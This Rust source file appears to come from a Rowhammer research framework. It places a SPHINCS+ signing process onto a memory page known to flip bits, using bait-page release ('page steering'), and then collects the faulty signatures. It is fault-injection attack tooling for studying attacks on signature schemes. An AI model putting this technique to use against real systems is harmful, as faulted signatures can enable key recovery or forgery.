use std::{
    fs::File,
    io::{BufRead, BufReader},
    process::{ChildStdin, ChildStdout},
    ptr::null_mut,
    thread,
    time::Duration,
};

use libc::sched_getcpu;
use serde::Serialize;

use crate::{
    allocator::util::{mmap, munmap},
    util::{PipeIPC, IPC, PAGE_SIZE},
    victim::process::piped_channel,
};

use super::{HammerVictim, HammerVictimError, VictimResult};

pub struct SphincsPlus {
    child: std::process::Child,
    pipe: PipeIPC<ChildStdout, ChildStdin>,
    stderr_logger: Option<thread::JoinHandle<()>>,
}

/// The injection configuration.
pub struct InjectionConfig {
    /// The flippy page.
    pub flippy_page: *mut libc::c_void,
    /// The flippy page size.
    pub flippy_page_size: usize,
    /// The number of bait pages to release before the flippy page.
    pub bait_count_after: usize,
    /// The number of bait pages to release after the flippy page.
    pub bait_count_before: usize,
}

fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
    use libc::{cpu_set_t, sched_setaffinity, CPU_SET, CPU_ZERO};

    unsafe {
        let mut cpuset: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);

        let result = sched_setaffinity(pid, std::mem::size_of::<cpu_set_t>(), &cpuset);
        if result != 0 {
            eprintln!(
                "Failed to set process affinity: {}",
                std::io::Error::last_os_error()
            );
        }
    }
}

fn get_current_core() -> usize {
    unsafe {
        let core_id = sched_getcpu();
        if core_id < 0 {
            panic!(
                "Failed to get current core: {}",
                std::io::Error::last_os_error()
            );
        } else {
            core_id as usize
        }
    }
}

#[derive(Debug, Serialize)]
pub struct StackProcessHammerResult {
    pipe_response: String,
    pub signatures: Vec<String>,
}

const KEYS_FILE: &str = "keys.txt";
const SIGS_FILE: &str = "sigs.txt";

impl SphincsPlus {
    /// Create a new `SphincsPlus` victim.
    ///
    /// # Arguments
    /// - `binary`: The path to the target binary.
    /// - `keys_path`: The path to the keys.
    /// - `sigs_path`: The output path to the signatures.
    /// - `injection_config`: The injection configuration.
    pub fn new(binary: String, injection_config: InjectionConfig) -> anyhow::Result<Self> {
        let bait: *mut libc::c_void =
            if injection_config.bait_count_before + injection_config.bait_count_after != 0 {
                mmap(
                    null_mut(),
                    (injection_config.bait_count_before + injection_config.bait_count_after)
                        * PAGE_SIZE,
                )
            } else {
                null_mut()
            };
        set_process_affinity(unsafe { libc::getpid() }, get_current_core());
        let mut cmd = std::process::Command::new("taskset");
        cmd.arg("-c").arg(get_current_core().to_string());
        cmd.arg(binary);
        cmd.arg(KEYS_FILE);
        cmd.arg(SIGS_FILE);
        cmd.stdin(std::process::Stdio::piped());
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());

        // TODO refactor InjectionStrategy
        info!("deallocating bait");
        unsafe {
            if injection_config.bait_count_before != 0 {
                munmap(bait, injection_config.bait_count_before * PAGE_SIZE);
            }
            munmap(
                injection_config.flippy_page,
                injection_config.flippy_page_size,
            );
            if injection_config.bait_count_after != 0 {
                munmap(
                    bait.byte_add(injection_config.bait_count_before * PAGE_SIZE),
                    injection_config.bait_count_after * PAGE_SIZE,
                );
            }
        }
        // spawn
        //info!("Launching victim");
        let mut child = cmd.spawn()?;
        info!("Victim launched");

        // Log victim stderr
        let stderr_logger = if let Some(stderr) = child.stderr.take() {
            let reader = BufReader::new(stderr);

            // Spawn a thread to handle logging from stderr
            let handle = thread::spawn(move || {
                for line in reader.lines() {
                    match line {
                        Ok(log_line) => {
                            info!("{}", log_line);
                        }
                        Err(err) => error!("Error reading line from child process: {}", err),
                    }
                }
            });
            Some(handle)
        } else {
            eprintln!("Failed to capture stderr");
            child.kill().expect("kill");
            child.wait().expect("wait");
            None
        };

        // todo: maybe check injection (prime+probe?)
        std::thread::sleep(Duration::from_millis(100));

        // Pin the child to the next core
        let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
        let target_core = (get_current_core() + 1) % num_cores as usize;
        info!("Pinning child to core {}", target_core);
        set_process_affinity(child.id() as libc::pid_t, target_core);

        // Create a pipe for IPC
        let pipe = piped_channel(&mut child)?;
        Ok(Self {
            child,
            pipe,
            stderr_logger,
        })
    }

    pub fn pid(&self) -> u32 {
        self.child.id()
    }
}

impl HammerVictim for SphincsPlus {
    fn start(&mut self) {
        if std::path::Path::new("sigs.txt").exists() {
            std::fs::remove_file("sigs.txt").expect("Failed to delete sigs.txt");
        }
    }
    fn init(&mut self) {}

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        self.pipe
            .wait_for("press enter to start check".to_string())?;
        self.pipe.send(b'\n')?;
        let resp: String = self.pipe.receive().map_err(HammerVictimError::IoError)?;
        if resp.starts_with("FLIPPED") {
            let file = File::open("sigs.txt").map_err(HammerVictimError::IoError)?;
            let reader = BufReader::new(file);
            let signatures: Vec<String> = reader
                .lines()
                .collect::<Result<_, _>>()
                .map_err(HammerVictimError::IoError)?;
            Ok(VictimResult::Strings(signatures))
        } else {
            Err(HammerVictimError::NoFlips)
        }
    }

    fn stop(mut self) {
        self.child.kill().expect("kill");
        self.child.wait().expect("wait");
        if let Some(stderr_logger) = self.stderr_logger {
            stderr_logger.join().expect("join");
        }
    }
}

#[cfg(test)]
mod tests {
    use std::ptr::null_mut;

    use crate::{
        allocator::util::mmap,
        util::PAGE_SIZE,
        victim::{sphincs_plus, HammerVictim},
    };

    #[test]
    fn test_sphincs_plus() -> anyhow::Result<()> {
        let ptr = mmap(null_mut(), PAGE_SIZE);
        let injection_config = super::InjectionConfig {
            flippy_page: ptr,
            flippy_page_size: PAGE_SIZE,
            bait_count_after: 0,
            bait_count_before: 0,
        };
        let mut stack_process = super::SphincsPlus::new(
            "/home/jb/sphincsplus/ref/test/server".to_string(),
            injection_config,
        )?;
        for _ in 0..10 {
            stack_process.init();
            let resp = stack_process.check();
            assert!(
                matches!(resp, Err(sphincs_plus::HammerVictimError::NoFlips),),
                "{:?}",
                resp
            );
        }
        Ok(())
    }
}
